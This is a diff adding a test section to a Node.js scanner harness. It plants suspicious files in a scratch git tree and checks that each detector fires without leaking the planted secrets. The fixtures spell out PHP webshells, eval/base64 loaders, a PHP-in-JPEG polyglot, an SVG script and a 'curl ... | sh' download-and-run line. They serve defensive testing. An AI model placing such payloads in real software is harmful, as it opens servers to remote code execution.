@@ -11,7 +11,9 @@
 //             so other people's uncommitted edits cannot move it), a foreign-build storefront, and a
 //             /docker/sporta-shaped tree around it (private/, backups/, releases/, loose files, old copies).
 //             Needs git and a clone with the history; chown-based checks need root and say so when skipped.
-//             The repo-side lane adds its own section next to this one.
+//   repo      the REPO-side scanner (scripts/unknown-files-scan.mjs, rules in ops/known-files.json): working tree,
+//             staged package and git history, proven on a scratch git copy of the tree with planted files, a
+//             scratch history, a fake staged package and the real tree (see the repo section below).
 //
 // WHAT "live" PROVES
 //   1. the manifest is a pure function of a commit and its mapping/skip/setup lists equal the deploy's own
@@ -31,6 +33,7 @@ import { execFileSync, spawnSync } from 'node:child_process'
 import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
+import crypto from 'node:crypto'
 import { fileURLToPath, pathToFileURL } from 'node:url'
 
 const HERE = path.dirname(fileURLToPath(import.meta.url))
@@ -530,7 +533,309 @@ async function mutations(CLEAN, PLANT, manifest) {
   }
 }
 
+// ================================================================ repo section
+// The REPO half of the unknown-files check: scripts/unknown-files-scan.mjs on a scratch copy of the tree
+// (git archive of HEAD, then planted files), on a scratch history with a committed-then-deleted secret,
+// on a fake staged package, and on the real tree.
+//
+//   node scripts/unknown-files-test.mjs --section repo
+//
+// WHAT "repo" PROVES
+//   1. the clean scratch copy is a baseline; every planted file produces the finding it should (webshell-like
+//      PHP in public/, base64+eval blob, .env, a private-key file with a FAKE random key, *.bak, PHP in a
+//      media folder, double extension, polyglot image, executable bit, case collision, unexplained binary,
+//      symlink, hidden file, SQL dump, zip holding a config.php, non-UTF-8 name, secrets in source, orphan
+//      script, NUL byte in source, download-and-run shell line ...) and NOTHING ELSE is newly flagged
+//   2. the scan writes nothing into the tree it scans and rewrites no history
+//   3. history: a secret committed and deleted is found with its first commit and "not in HEAD", a config.php
+//      ever added is named, the biggest blob is ranked first, a zip holding config.php is opened, a SQL dump
+//      is named; no secret value reaches the JSON or the Markdown
+//   4. the output is deterministic (two runs, byte-identical)
+//   5. exit code: 0 when everything is explained, 1 for a stray file or a blocking finding
+//   6. the fake package: an unknown PHP file, a forbidden config.php and an eval are found, file-audit.mjs runs
+//   7. the real tree gives the documented result: no UNKNOWN file, no unexplained high finding, every blocking
+//      finding documented in ops/known-files.json, every rule in the manifest still matches something
+//   8. MUTATIONS: detectors are blinded (UFS_BLIND) and the check that depends on each must fail, and only that
+//      one; an emptied manifest makes the baseline fill with UNKNOWN files
+async function repoSection() {
+  const SCAN = path.join(HERE, 'unknown-files-scan.mjs')
+  const MAN = path.join(WEB, 'ops', 'known-files.json')
+  let runNo = 0
+  const rnd = (n) => crypto.randomBytes(n * 2).toString('base64').replace(/[^A-Za-z0-9]/g, '').padEnd(n, 'q').slice(0, n)
+  const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...args], { cwd, encoding: 'utf8', maxBuffer: 1 << 28, stdio: ['ignore', 'pipe', 'pipe'] })
+  const scan = (root, extra = [], env = {}, manifest = MAN) => {
+    const out = path.join(TMP, `repo-run-${++runNo}.json`), md = path.join(TMP, `repo-run-${runNo}.md`)
+    const r = spawnSync(process.execPath, [SCAN, '--root', root, '--manifest', manifest, '--json', out, '--md', md, '--quiet', ...extra], { encoding: 'utf8', env: { ...process.env, ...env }, maxBuffer: 1 << 28 })
+    const json = fs.existsSync(out) ? JSON.parse(fs.readFileSync(out, 'utf8')) : null
+    return { status: r.status, stderr: r.stderr || '', json, text: json ? fs.readFileSync(out, 'utf8') + fs.readFileSync(md, 'utf8') : '' }
+  }
+  const findingsOf = (R) => R.json?.findings || []
+  const has = (R, det, where) => findingsOf(R).some((f) => f.detector === det && (f.where === where || f.where.includes(where)))
+  const key = (f) => `${f.detector}|${f.where}`
+  const snapshot = (root) => [git(root, 'rev-parse', 'HEAD'), git(root, 'for-each-ref'), git(root, 'status', '--porcelain=v1', '-uall'), git(root, 'count-objects')].join('\n--\n')
+
+  // ------------------------------------------------------------ the scratch copy
+  const ROOT = path.join(TMP, 'tree')
+  fs.mkdirSync(ROOT, { recursive: true })
+  const arch = spawnSync('git', ['-C', REPO, 'archive', 'HEAD'], { maxBuffer: 1 << 30 })
+  if (arch.status !== 0) { bad('git archive HEAD of the repo', String(arch.stderr)); return }
+  const tar = spawnSync('tar', ['-x', '-C', ROOT], { input: arch.stdout, maxBuffer: 1 << 28 })
+  check(tar.status === 0, 'scratch copy of the tree: git archive HEAD extracted')
+  git(ROOT, 'init', '-q', '-b', 'main')
+  git(ROOT, 'add', '-A')
+  git(ROOT, 'commit', '-q', '-m', 'base')
+
+  const B0 = scan(ROOT)
+  check(!!B0.json && B0.json.counts.entries > 100, `baseline scan of the scratch copy runs (${B0.json?.counts?.entries} entries, ${B0.json?.counts?.unknown} unknown, exit ${B0.status})`, B0.stderr.slice(0, 300))
+  if (!B0.json) return
+
+  // ---------------------------------------------------------- history plants (committed, then deleted)
+  const SEC_DB = rnd(26), SEC_CRON = rnd(24), SEC_PEM = crypto.randomBytes(300).toString('base64'), SEC_ZIP = rnd(20)
+  const ZIPFILE = path.join(TMP, 'bundle.zip')
+  const zdir = path.join(TMP, 'zsrc'); fs.mkdirSync(path.join(zdir, 'api'), { recursive: true })
+  fs.writeFileSync(path.join(zdir, 'api/config.php'), `<?php return ['k' => '${SEC_ZIP}'];`)
+  fs.writeFileSync(path.join(zdir, 'api/store.php'), '<?php echo 1;')
+  const haveZip = spawnSync('zip', ['-q', '-r', ZIPFILE, 'api'], { cwd: zdir }).status === 0
+  const old = path.join(ROOT, 'sporta-web/old-deploy')
+  fs.mkdirSync(old, { recursive: true })
+  fs.writeFileSync(path.join(old, 'config.php'), `<?php\nreturn [\n  'db_pass' => '${SEC_DB}',\n  'cron_key' => '${SEC_CRON}',\n];\n`)
+  fs.writeFileSync(path.join(old, 'dump.sql'), `-- MySQL dump 10.13  Distrib 8.0.36\nINSERT INTO \`orders\` VALUES (1,'a');\nINSERT INTO \`orders\` VALUES (2,'b');\nINSERT INTO \`orders\` VALUES (3,'c');\nINSERT INTO \`orders\` VALUES (4,'d');\n-- Dump completed on 2026-01-01\n`)
+  fs.writeFileSync(path.join(old, 'blob.bin'), crypto.randomBytes(3_000_000))
+  if (haveZip) fs.copyFileSync(ZIPFILE, path.join(old, 'bundle.zip'))
+  git(ROOT, 'add', '-f', 'sporta-web/old-deploy')
+  git(ROOT, 'commit', '-q', '-m', 'add the old deploy')
+  const H1 = git(ROOT, 'rev-parse', '--short=8', 'HEAD').trim()
+  git(ROOT, 'rm', '-r', '-q', 'sporta-web/old-deploy')
+  git(ROOT, 'commit', '-q', '-m', 'remove the old deploy')
+
+  // ---------------------------------------------------------------- working-tree plants
+  const planted = []
+  const put = (rel, body, opt = {}) => {
+    const p = path.join(ROOT, rel)
+    fs.mkdirSync(path.dirname(p), { recursive: true })
+    if (opt.link) fs.symlinkSync(opt.link, p)
+    else fs.writeFileSync(p, body)
+    if (opt.mode) fs.chmodSync(p, opt.mode)
+    planted.push(rel)
+  }
+  const B64 = crypto.randomBytes(300).toString('base64')
+  const KEY = `-----BEGIN OPENSSH PRIVATE KEY-----\n${SEC_PEM.match(/.{1,70}/g).join('\n')}\n-----END OPENSSH PRIVATE KEY-----\n`
+  const AWS = 'AKIA' + 'ABCDEFGHIJKLMNOP'.split('').sort(() => Math.random() - 0.5).join('')
+  const GH = 'gh' + 'p_' + rnd(36), APIK = rnd(40), ENVPW = rnd(24)
+  put('sporta-web/public/shell.php', `<?php @eval($_POST['cmd']); ?>\n`)
+  put('sporta-web/dropin/php-store/legacy-import.php', `<?php\neval(gzinflate(base64_decode('${B64}')));\n`)
+  put('sporta-web/public/helper.js', `eval(atob('${B64.slice(0, 120)}'))\n`)
+  put('sporta-web/.env', `APP_ENV=production\nDB_PASSWORD=${ENVPW}\n`)
+  put('sporta-web/ops/deploy_key.pem', KEY)
+  put('sporta-web/public/config.js.bak', 'window.SPORTA_CONFIG={}\n')
+  put('sporta-web/public/cats/desktop/thumb.php', '<?php echo 1;\n')
+  put('sporta-web/public/images/products/photo.jpg.php', '<?php echo 2;\n')
+  put('sporta-web/public/cats/mobile/evil.php.jpg', Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10]), Buffer.from("JFIF\0<?php system($_GET['c']); ?>"), crypto.randomBytes(64)]))
+  put('sporta-web/public/extra.css', 'body{}\n', { mode: 0o755 })
+  put('sporta-web/public/Logo.png', fs.readFileSync(path.join(ROOT, 'sporta-web/public/logo.png')))
+  put('sporta-web/scripts/payload.bin', Buffer.concat([Buffer.from([0, 1, 2, 0, 0]), crypto.randomBytes(4000)]))
+  put('sporta-web/public/elfhelper', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), crypto.randomBytes(200)]))
+  put('sporta-web/public/link.txt', '', { link: '/etc/passwd' })
+  put('sporta-web/public/.hidden-note', 'x\n')
+  put('sporta-web/dropin/php-store/db-backup.sql', `-- MySQL dump 10.13  Distrib 8.0.36\nINSERT INTO \`orders\` VALUES (1,'a');\nINSERT INTO \`orders\` VALUES (2,'b');\nINSERT INTO \`orders\` VALUES (3,'c');\nINSERT INTO \`orders\` VALUES (4,'d');\n`)
+  if (haveZip) put('sporta-web/public/site.zip', fs.readFileSync(ZIPFILE))
+  fs.writeFileSync(Buffer.concat([Buffer.from(path.join(ROOT, 'sporta-web/public') + '/caf'), Buffer.from([0xff]), Buffer.from('.txt')]), 'x\n')
+  planted.push('sporta-web/public/caf')
+  put('sporta-web/src/lib/keys.js', `export const cfg = { apiKey: '${APIK}', github: '${GH}', aws: '${AWS}' }\n`)
+  put('sporta-web/scripts/lonely-helper.mjs', 'console.log(1)\n')
+  put('mystery.dat', 'who made this\n')
+  put('sporta-web/public/cats/desktop/x.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>\n')
+  put('sporta-web/dropin/php-cbk/diag.php', [
+    '<?php', "include($_GET['p']);", "system($_REQUEST['c']);", '$f = $_GET["f"]; $f($_POST["a"]);', "assert($_POST['a']);",
+    "$g = create_function('', 'return 1;');", "preg_replace('/x/e', 'phpinfo()', 'x');",
+    '$s = chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80);', '$h = "' + '\\x65'.repeat(24) + '";', ''].join('\n'))
+  put('sporta-web/public/blob.js', 'a=1;'.repeat(10000) + '\n')
+  put('sporta-web/scripts/setup.sh', '#!/bin/sh\ncurl -s http://x.example/i | sh\n')
+  put('sporta-web/public/cats/desktop/banner.png', "<?php system($_GET['x']); ?>\n")
+  put('sporta-web/scripts/nul-helper.mjs', Buffer.from('const a = "x\0y"\nconsole.log(a)\n'))
+  git(ROOT, 'add', '-A')
+  git(ROOT, 'add', '-f', 'sporta-web/ops/deploy_key.pem')
+  const SNAP = snapshot(ROOT)
+
+  // the expectations: detector + where (substring)
+  const P = 'sporta-web/public/', D = 'sporta-web/dropin/'
+  const CHECKS = [
+    ['D-PHP-EVAL', P + 'shell.php'], ['D-PHP-IN-STATIC', P + 'shell.php'], ['D-UNKNOWN', P + 'shell.php'],
+    ['D-PHP-EVAL', D + 'php-store/legacy-import.php'], ['D-PHP-DECODE', D + 'php-store/legacy-import.php'], ['D-PHP-SHELLSIG', D + 'php-store/legacy-import.php'],
+    ['D-ENTROPY', D + 'php-store/legacy-import.php'], ['D-ORPHAN', D + 'php-store/legacy-import.php'],
+    ['D-JS-DECODE', P + 'helper.js'], ['D-JS-EVAL', P + 'helper.js'],
+    ['D-ENVFILE', 'sporta-web/.env'], ['S-ENVLINE', 'sporta-web/.env'],
+    ['D-KEYFILE', 'sporta-web/ops/deploy_key.pem'], ['S-PRIVKEY', 'sporta-web/ops/deploy_key.pem'], ['D-TRACKED-IGNORED', 'sporta-web/ops/deploy_key.pem'],
+    ['D-BACKUP-NAME', P + 'config.js.bak'], ['D-UNKNOWN', P + 'config.js.bak'],
+    ['D-PHP-IN-MEDIA', P + 'cats/desktop/thumb.php'], ['D-PHP-IN-STATIC', P + 'cats/desktop/thumb.php'],
+    ['D-DOUBLE-EXT', P + 'images/products/photo.jpg.php'], ['D-PHP-IN-MEDIA', P + 'images/products/photo.jpg.php'],
+    ['D-POLYGLOT', P + 'cats/mobile/evil.php.jpg'], ['D-DOUBLE-EXT', P + 'cats/mobile/evil.php.jpg'],
+    ['D-EXEC-BIT', P + 'extra.css'],
+    ['D-CASE-COLLIDE', P + 'logo.png'],
+    ['D-BINARY-UNK', 'sporta-web/scripts/payload.bin'], ['D-UNKNOWN', 'sporta-web/scripts/payload.bin'],
+    ['D-BINARY-UNK', P + 'elfhelper'],
+    ['D-SYMLINK', P + 'link.txt'],
+    ['D-HIDDEN', P + '.hidden-note'], ['D-UNKNOWN', P + '.hidden-note'],
+    ['D-SQL-DUMP', D + 'php-store/db-backup.sql'],
+    ...(haveZip ? [['D-ARCHIVE', P + 'site.zip']] : []),
+    ['D-NAME-ODD', P + 'caf'],
+    ['S-NAMED', 'sporta-web/src/lib/keys.js'], ['S-GITHUB', 'sporta-web/src/lib/keys.js'], ['S-AWS', 'sporta-web/src/lib/keys.js'],
+    ['D-ORPHAN', 'sporta-web/scripts/lonely-helper.mjs'],
+    ['D-UNKNOWN', 'mystery.dat'],
+    ['D-SVG-ACTIVE', P + 'cats/desktop/x.svg'],
+    ['D-PHP-USERINC', D + 'php-cbk/diag.php'], ['D-PHP-EXEC', D + 'php-cbk/diag.php'], ['D-PHP-VARFUNC', D + 'php-cbk/diag.php'], ['D-PHP-ASSERT', D + 'php-cbk/diag.php'],
+    ['D-PHP-CREATEFN', D + 'php-cbk/diag.php'], ['D-PHP-PREG-E', D + 'php-cbk/diag.php'], ['D-CHR-BUILD', D + 'php-cbk/diag.php'], ['D-HEX-STRING', D + 'php-cbk/diag.php'],
+    ['D-LONGLINE', P + 'blob.js'],
+    ['D-SHELL-PIPE', 'sporta-web/scripts/setup.sh'],
+    ['D-BINARY-UNK', P + 'cats/desktop/banner.png'], ['D-PHP-EXEC', P + 'cats/desktop/banner.png'],
+    ['D-NUL-IN-TEXT', 'sporta-web/scripts/nul-helper.mjs'],
+  ]
+
+  // ------------------------------------------------ 1. every planted file is found, nothing else is new
+  const B1 = scan(ROOT)
+  check(!!B1.json, 'planted tree: the scan runs', B1.stderr.slice(0, 300))
+  if (!B1.json) return
+  check(B1.status === 1, `planted tree: exit code 1 (blocking findings), got ${B1.status}`)
+  let missed = 0
+  for (const [det, where] of CHECKS) {
+    const found = has(B1, det, where)
+    if (!found) missed++
+    check(found, `planted ${det.padEnd(18)} ${where}`)
+  }
+  const before = new Set(findingsOf(B0).map(key))
+  const fresh = findingsOf(B1).filter((f) => !before.has(key(f)))
+  const stray = fresh.filter((f) => !planted.some((p) => f.where === p || f.where.startsWith(p)) && !['D-DUPLICATE', 'D-LARGE', 'D-CASE-COLLIDE'].includes(f.detector))
+  check(stray.length === 0, `nothing else is newly flagged (${fresh.length} new findings, all on planted files)`, stray.slice(0, 5).map(key).join('; '))
+  const unknownNow = new Set(B1.json.unknown.map((u) => u.path))
+  check(['sporta-web/public/shell.php', 'mystery.dat', 'sporta-web/public/config.js.bak', 'sporta-web/public/.hidden-note'].every((p) => unknownNow.has(p)), 'planted strangers are listed as UNKNOWN files')
+  check(B1.json.suspicious_files.includes('sporta-web/public/shell.php') && B1.json.suspicious_files.includes('sporta-web/ops/deploy_key.pem'), 'planted webshell and key file are listed as SUSPICIOUS files')
+  const leaked = [SEC_DB, SEC_CRON, SEC_PEM.slice(0, 40), SEC_ZIP, APIK, GH, AWS, ENVPW].filter((v) => B1.text.includes(v))
+  check(leaked.length === 0, 'no planted secret value appears in the JSON or the Markdown', `${leaked.length} leaked`)
+  const mask = findingsOf(B1).find((f) => f.detector === 'S-NAMED' && f.where.endsWith('keys.js'))
+  check(!!mask && /\b\w{0,4}…\(\d+\)/.test(mask.evidence) && !mask.evidence.includes(APIK.slice(0, 8)), 'a secret is shown as at most four characters and a length', mask?.evidence?.slice(0, 120))
+  const pk = findingsOf(B1).find((f) => f.detector === 'S-PRIVKEY')
+  check(!!pk && /no value shown/.test(pk.evidence), 'a private-key block shows nothing but that one exists')
+
+  // ------------------------------------------------ 2. writes nothing, rewrites nothing
+  check(snapshot(ROOT) === SNAP, 'the scan changed nothing in the scanned tree (HEAD, refs, index/status, object count)')
+
+  // ------------------------------------------------ 4. deterministic
+  const B1b = scan(ROOT)
+  check(B1b.text === B1.text && B1.text.length > 1000, `two runs on the same tree are byte-identical (${B1.text.length} bytes)`)
+
+  // ------------------------------------------------ 5. exit codes on a tiny tree
+  const MINI = path.join(TMP, 'mini'); fs.mkdirSync(MINI, { recursive: true })
+  fs.writeFileSync(path.join(MINI, 'README.md'), '# hi\n')
+  git(MINI, 'init', '-q', '-b', 'main'); git(MINI, 'add', '-A'); git(MINI, 'commit', '-q', '-m', 'm')
+  const MINIMAN = path.join(TMP, 'mini-manifest.json')
+  fs.writeFileSync(MINIMAN, JSON.stringify({ rules: [{ id: 'R-README', glob: ['README.md'], purpose: 'docs', owner: 'test', web: false }] }))
+  const M0 = scan(MINI, [], {}, MINIMAN)
+  check(M0.status === 0 && M0.json.counts.unknown === 0, `a fully explained tree exits 0 (${M0.json?.counts?.entries} entry, ${M0.json?.counts?.unknown} unknown)`)
+  fs.writeFileSync(path.join(MINI, 'stray.dat'), 'x')
+  const M1 = scan(MINI, [], {}, MINIMAN)
+  check(M1.status === 1 && M1.json.counts.unknown === 1, 'one unexplained file makes it exit 1 and count 1 UNKNOWN')
+  fs.writeFileSync(MINIMAN, JSON.stringify({ rules: [{ id: 'R-README', glob: ['README.md'], purpose: 'docs', owner: 'test', web: false }], acknowledged: [] }))
+  const M2 = spawnSync(process.execPath, [SCAN, '--root', MINI, '--manifest', '/nonexistent.json', '--quiet'], { encoding: 'utf8' })
+  check(M2.status === 2, 'a missing manifest is a usage error (exit 2)')
+
+  // ------------------------------------------------ 3. history
+  const Hh = scan(ROOT, ['--no-tree', '--history'])
+  const H = Hh.json?.history
+  check(!!H, 'history scan of the scratch repository runs', Hh.stderr.slice(-300))
+  if (H) {
+    const g = H.secret_groups.filter((x) => x.paths.includes('sporta-web/old-deploy/config.php'))
+    check(g.length >= 2 && g.every((x) => x.verdict === 'real' && x.in_head === false && x.first_commit === H1), `history: the committed-then-deleted db_pass and cron_key are found (real, first commit ${H1}, not in HEAD)`, JSON.stringify(g.map((x) => [x.key, x.verdict, x.first_commit, x.in_head])))
+    const nm = H.name_sweep.find((x) => x.path === 'sporta-web/old-deploy/config.php')
+    check(!!nm && nm.class === 'config-or-env' && nm.first_commit === H1 && nm.in_head === false, 'history: a config.php that was ever added is named, with its first commit and "not in HEAD"')
+    check(H.top_blobs[0]?.path === 'sporta-web/old-deploy/blob.bin' && H.top_blobs[0].size === 3_000_000 && H.top_blobs[0].in_head === false, 'history: the biggest blob ever committed is ranked first with its path')
+    if (haveZip) {
+      const z = H.zips.find((x) => x.path.endsWith('old-deploy/bundle.zip'))
+      check(!!z && z.names_of_note.includes('api/config.php') && z.in_head === false, 'history: a zip holding api/config.php is opened and the member is named')
+    }
+    check(H.sql_dumps.some((d) => d.path === 'sporta-web/old-deploy/dump.sql'), 'history: a SQL dump is named')
+    check(H.dead_weight.blobs_not_in_head >= 4, `history: blobs no longer in HEAD are counted (${H.dead_weight.blobs_not_in_head})`)
+    check(H.proposal.commands.join('\n').includes('filter-repo') && /PROPOSAL ONLY/.test(H.proposal.note) && H.proposal.blast_radius.length >= 3, 'history: a cleanup is PROPOSED with its blast radius, never run')
+    const hl = [SEC_DB, SEC_CRON, SEC_ZIP].filter((v) => Hh.text.includes(v))
+    check(hl.length === 0, 'history: no secret value reaches the JSON or the Markdown', `${hl.length} leaked`)
+  }
+  check(snapshot(ROOT) === SNAP, 'the history scan rewrote nothing (HEAD, refs, status, object count unchanged)')
+
+  // ------------------------------------------------ 6. a fake staged package
+  const STAGE = path.join(TMP, 'stage'); const pub = path.join(STAGE, 'public_html')
+  for (const d of ['api', 'assets', 'knet']) fs.mkdirSync(path.join(pub, d), { recursive: true })
+  fs.mkdirSync(path.join(STAGE, 'database-sql'), { recursive: true })
+  fs.writeFileSync(path.join(pub, 'index.html'), '<!doctype html><title>x</title>')
+  fs.copyFileSync(path.join(REPO, 'sporta-web/public/.htaccess'), path.join(pub, '.htaccess'))
+  fs.copyFileSync(path.join(REPO, 'sporta-web/dropin/php-store/store.php'), path.join(pub, 'api/store.php'))
+  fs.writeFileSync(path.join(pub, 'assets/app-abc123.js'), 'console.log(1)')
+  fs.writeFileSync(path.join(pub, 'shell.php'), `<?php @eval($_POST['cmd']); ?>`)
+  fs.writeFileSync(path.join(pub, 'api/config.php'), `<?php return ['db_pass' => '${rnd(20)}'];`)
+  fs.writeFileSync(path.join(STAGE, 'database-sql/IMPORT-THIS-ONE.sql'), '-- sql\n')
+  const PK = scan(ROOT, ['--no-tree', '--package', STAGE])
+  const pk2 = PK.json?.package
+  check(!!pk2, 'package: a staged tree is classified', PK.stderr.slice(-300))
+  if (pk2) {
+    check(pk2.unknown.includes('public_html/shell.php') && pk2.unknown.includes('public_html/api/config.php'), 'package: a PHP file with no source and a config.php in api/ are UNKNOWN')
+    check(has(PK, 'D-PHP-EVAL', 'package:public_html/shell.php'), 'package: the eval in the staged shell is found')
+    check(has(PK, 'D-ENVFILE', 'package:public_html/api/config.php'), 'package: a config.php inside the package is a credential finding')
+    check(pk2.known >= 4 && pk2.by_rule['PKG-BACKEND-SOURCE'] >= 1 && pk2.by_rule['PKG-VITE-ASSETS'] === 1, `package: real files are matched to their source (${pk2.known} known: ${JSON.stringify(pk2.by_rule)})`)
+    check(pk2.file_audit.exit === 1 && /high/.test(pk2.file_audit.summary), `package: file-audit.mjs ran on the staged tree and refused it (${pk2.file_audit.summary})`)
+  }
+
+  // ------------------------------------------------ 8. mutations
+  // Blind detectors in groups; every check tied to a blinded detector must fail and every other must still pass.
+  const dets = [...new Set(CHECKS.map((c) => c[0]))]
+  const groups = [0, 1, 2].map((m) => dets.filter((_, i) => i % 3 === m))
+  for (const [gi, grp] of groups.entries()) {
+    const R = scan(ROOT, [], { UFS_BLIND: grp.join(',') })
+    if (!R.json) { bad(`mutation group ${gi + 1} runs`, R.stderr.slice(0, 200)); continue }
+    let wrong = []
+    for (const [det, where] of CHECKS) {
+      const found = has(R, det, where)
+      if (grp.includes(det) && found) wrong.push(`${det} still reported at ${where}`)
+      if (!grp.includes(det) && !found && has(B1, det, where)) wrong.push(`${det} at ${where} lost without being blinded`)
+    }
+    check(wrong.length === 0, `mutation: blinding ${grp.length} detectors (${grp.slice(0, 4).join(', ')}${grp.length > 4 ? ', ...' : ''}) fails exactly their ${CHECKS.filter((c) => grp.includes(c[0])).length} checks`, wrong.slice(0, 3).join('; '))
+  }
+  fs.writeFileSync(path.join(TMP, 'empty-manifest.json'), '{"rules":[]}')
+  const E2 = scan(ROOT, [], {}, path.join(TMP, 'empty-manifest.json'))
+  check(!!E2.json && E2.json.counts.unknown > B0.json.counts.unknown + 50, `mutation: an emptied manifest leaves the tree full of UNKNOWN files (${E2.json?.counts?.unknown} vs ${B0.json.counts.unknown})`)
+  if (H) {
+    for (const [gate, probe] of [['S-NAMED', (h) => h.secret_groups.filter((x) => x.id === 'S-NAMED' && x.paths.includes('sporta-web/old-deploy/config.php')).length === 0],
+      ['H-SECRETS', (h) => h.secret_groups.length === 0], ['H-NAMES', (h) => h.name_sweep.length === 0], ['H-BLOAT', (h) => h.top_blobs.length === 0], ['H-ZIPS', (h) => h.zips.length === 0]]) {
+      const R = scan(ROOT, ['--no-tree', '--history'], { UFS_BLIND: gate })
+      check(!!R.json?.history && probe(R.json.history), `mutation: blinding ${gate} removes exactly its history evidence`)
+    }
+  }
+
+  // ------------------------------------------------ 7. the real tree
+  const RT = scan(REPO)
+  check(!!RT.json, 'real tree: the scan runs', RT.stderr.slice(0, 300))
+  if (RT.json) {
+    const c = RT.json.counts
+    check(c.entries === c.known_by_rule + c.known_by_reference + c.unknown + c.named_only_in_docs + c.tracked_missing_on_disk, `real tree: ${c.entries} entries (${c.scanned} files), each classified exactly once: ${c.known_by_rule} by a rule, ${c.known_by_reference} by a reference, ${c.unknown} unknown, ${c.named_only_in_docs} named only in docs`)
+    const unk = RT.json.unknown
+    const trackedUnknown = unk.filter((u) => u.tracked)
+    check(trackedUnknown.length === 0, 'real tree: no TRACKED file is unexplained (every committed file has a rule or a reference)', trackedUnknown.slice(0, 5).map((u) => u.path).join('; '))
+    for (const u of unk.filter((x) => !x.tracked)) console.log(`note untracked and unexplained (a running session's scratch?): ${u.path}`)
+    const untrackedUnknown = new Set(unk.filter((u) => !u.tracked).map((u) => u.path))
+    const hi = findingsOf(RT).filter((f) => f.severity === 'high' && !f.acknowledged)
+    check(hi.length === 0, 'real tree: no unexplained HIGH finding (no secret, no executable web file, no webshell shape)', hi.slice(0, 4).map((f) => `${f.detector} ${f.where}`).join('; '))
+    const blocking = findingsOf(RT).filter((f) => RT.json.blocking.includes(f.id))
+    const undocumented = blocking.filter((f) => !f.documented && !(f.detector === 'D-UNKNOWN' && untrackedUnknown.has(f.where)))
+    check(undocumented.length === 0, `real tree: every blocking finding is documented in ops/known-files.json (${blocking.length} blocking, exit ${RT.status})`, undocumented.slice(0, 4).map((f) => `${f.detector} ${f.where}`).join('; '))
+    check(RT.status === (blocking.length ? 1 : 0), 'real tree: the exit code follows the blocking findings')
+    check((RT.json.unused_rules || []).length === 0, 'real tree: every non-optional rule in the manifest still matches a file', (RT.json.unused_rules || []).join(', '))
+    const doc = ['D-TRACKED-IGNORED|SPORTA-BACKEND.zip', 'D-STALE-COPY|sporta-live/', 'D-GENERATED|brand/hero/__pycache__/grade.cpython-311.pyc', 'D-SENSITIVE-DATA|sporta-web/data/ahed.json']
+    const keys = new Set(findingsOf(RT).map(key))
+    for (const d of doc) if (!keys.has(d)) console.log(`note ${d.replace('|', ' ')}: documented finding is gone (resolved? then remove it from ops/FILES-SCAN.md)`)
+    check(RT.json.archives.some((a) => a.path === 'SPORTA-BACKEND.zip') || !fs.existsSync(path.join(REPO, 'SPORTA-BACKEND.zip')), 'real tree: SPORTA-BACKEND.zip is opened and compared with the tree')
+    check(Object.keys(RT.json.trees).sort().join() === 'brand,sporta-app,sporta-html5,sporta-live', 'real tree: the side trees are described (sporta-live, sporta-html5, sporta-app, brand)')
+  }
+}
+
 // ---------------------------------------------------------------- main
+if (wanted === 'all' || wanted === 'repo') await repoSection()
 if (wanted === 'all' || wanted === 'live') {
   await liveSection()
   // the mutation harness reuses the docroots the live section left in TMP
